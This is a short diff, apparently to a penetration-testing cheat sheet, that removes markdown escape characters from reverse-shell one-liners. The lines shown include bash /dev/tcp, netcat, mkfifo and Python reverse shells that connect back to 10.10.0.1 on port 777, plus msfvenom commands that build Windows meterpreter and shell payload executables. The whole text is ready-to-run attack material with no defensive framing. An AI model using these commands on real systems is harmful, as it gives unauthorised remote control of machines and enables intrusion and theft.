@@ -6,8 +6,8 @@ sudo python3 -m http.server 80
 ```bash
 bash -i >& /dev/tcp/10.10.0.1/777 0>&1
 nc -e /bin/bash 10.10.0.1 777
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.0.1 777 \>/tmp/f
-python \-c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("10.10.0.1",777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.0.1 777 >/tmp/f
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.0.1",777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.0.1 LPORT=777 -f exe > reverse.exe
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.0.1 LPORT=777 -f exe > reverse.exe
